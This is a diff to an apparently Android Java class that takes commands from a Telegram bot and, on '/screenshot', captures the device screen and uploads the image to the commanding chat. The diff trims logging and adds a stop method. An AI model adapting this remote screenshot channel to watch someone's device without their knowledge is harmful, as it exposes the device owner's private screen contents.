@@ -45,10 +45,15 @@ public class TelegramEngine implements Runnable {
             try {
                 getUpdates();
             } catch (Exception e) {
-                Log.e(TAG, "❌ Ошибка в цикле getUpdates: " + e.getMessage());
+                Log.e(TAG, "❌ Ошибка в getUpdates: " + e.getMessage());
                 sleep(5000);
             }
         }
+    }
+
+    public void stop() {
+        this.running = false;
+        Log.i(TAG, "🛑 Остановка TelegramEngine...");
     }
 
     private void getUpdates() throws IOException, JSONException {
@@ -76,10 +81,8 @@ public class TelegramEngine implements Runnable {
             long chatId = msg.getJSONObject("chat").getLong("id");
             String text = msg.optString("text", "");
 
-            Log.d(TAG, "📩 Сообщение от " + chatId + ": " + text);
-
             if (text.equals("/screenshot")) {
-                Log.i(TAG, "📸 Команда /screenshot. Запуск запроса разрешения...");
+                Log.i(TAG, "📸 Команда скриншота принята");
                 Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
                 intent.putExtra("chat_id", chatId);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -89,8 +92,7 @@ public class TelegramEngine implements Runnable {
     }
 
     public void sendPhoto(long chatId, File photo) {
-        Log.i(TAG, "📤 Отправка скриншота (" + photo.length() / 1024 + " KB)...");
-        
+        Log.i(TAG, "📤 Отправка файла в Telegram...");
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", String.valueOf(chatId))
@@ -104,39 +106,34 @@ public class TelegramEngine implements Runnable {
                 .build();
 
         try (Response response = httpClient.newCall(request).execute()) {
-            String responseString = response.body().string();
             if (response.isSuccessful()) {
-                Log.i(TAG, "✅ Скриншот успешно отправлен!");
+                Log.i(TAG, "✅ Скриншот отправлен успешно");
             } else {
-                Log.e(TAG, "❌ Ошибка Telegram API: " + response.code() + " | " + responseString);
+                Log.e(TAG, "❌ Ошибка API: " + response.code());
             }
         } catch (IOException e) {
-            Log.e(TAG, "🚨 Сетевая ошибка при отправке фото: " + e.getMessage());
+            Log.e(TAG, "🚨 Ошибка сети: " + e.getMessage());
         } finally {
             if (photo.exists()) photo.delete();
         }
     }
 
     public void sendMessage(long chatId, String text) {
+        String url = API_BASE + botToken + "/sendMessage";
+        JSONObject json = new JSONObject();
         try {
-            JSONObject json = new JSONObject();
             json.put("chat_id", chatId);
             json.put("text", text);
-            post("sendMessage", json.toString());
-        } catch (Exception e) {
-            Log.e(TAG, "Error building message", e);
-        }
-    }
-
-    private void post(String method, String jsonBody) {
-        String url = API_BASE + botToken + "/" + method;
-        RequestBody body = RequestBody.create(jsonBody, MediaType.parse("application/json"));
+        } catch (JSONException ignored) {}
+        
+        RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json"));
         Request request = new Request.Builder().url(url).post(body).build();
-        try (Response response = httpClient.newCall(request).execute()) {
-            if (!response.isSuccessful()) Log.w(TAG, method + " FAILED: " + response.code());
-        } catch (IOException e) {
-            Log.e(TAG, method + " Error: " + e.getMessage());
-        }
+        httpClient.newCall(request).enqueue(new okhttp3.Callback() {
+            @Override public void onFailure(okhttp3.Call call, IOException e) {}
+            @Override public void onResponse(okhttp3.Call call, Response response) throws IOException {
+                response.close();
+            }
+        });
     }
 
     private static void sleep(long ms) {
